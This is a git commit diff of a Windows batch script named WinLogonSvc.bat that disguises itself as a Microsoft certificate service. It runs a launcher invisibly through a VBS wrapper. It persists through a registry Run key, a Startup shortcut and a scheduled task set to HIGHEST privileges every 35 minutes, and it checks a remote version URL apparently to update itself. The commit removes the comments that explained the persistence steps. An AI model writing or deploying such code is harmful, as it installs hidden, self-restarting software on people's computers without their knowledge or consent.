cd49cc1c241557cfb0ddea24a16b4114b13c1271
escola-iracema <e047491w10@professor.educacao.sp.gov.br>
2025-08-04 17:34:16 -0300

    Update WinLogonSvc.bat

--- WinLogonSvc.bat
+++ WinLogonSvc.bat
@@ -1,4 +1,4 @@
-set "LAUNCHER_VERSION=1.1"
+set "LAUNCHER_VERSION=1.2"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 
 set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
@@ -24,20 +24,17 @@ set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
 set "targetPath=%launcherScriptPath%"
 
-:: Cria o script VBS para rodar o launcher invisivelmente
 (
-    echo Set WshShell = CreateObject("WScript.Shell"^)
-    echo WshShell.Run """" ^& WScript.Arguments(0) ^& """" , 0, False
+    echo Set WshShell = CreateObject^("WScript.Shell"^)
+    echo WshShell.Run ^"""" & WScript.Arguments(0) & """" , 0, False
 ) > "%vbsLauncherPath%"
 
-:: 1. Persistência via registro HKCU
 set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
 if %errorlevel% neq 0 (
     reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /f >nul
 )
 
-:: 2. Persistência via atalho na pasta Startup do usuário
 set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
 if not exist "%shortcutPath%" (
     powershell -Command ^
@@ -49,13 +46,11 @@ if not exist "%shortcutPath%" (
          $s.Save()" >nul 2>&1
 )
 
-:: 3. Persistência via Tarefa Agendada rodando a cada 35 minutos com privilégios elevados
 schtasks /query /tn "SystemCertService" >nul 2>&1
 if %errorlevel% neq 0 (
     schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
 )
 
-:: Inicia o worker, se existir, em background com prioridade alta
 if exist "%workerScriptPath%" (
     start "" /B /high "%workerScriptPath%"
 )
@@ -64,10 +59,6 @@ if exist "%workerScriptPath%" (
 endlocal
 exit /b
 
-
-
-
-:: Logging
 set "logPath=%LOCALAPPDATA%\Microsoft\SystemCertificates\WinLogonSvc.log"
 echo %DATE% %TIME% - WinLogonSvc executado. >> "%logPath%"
 
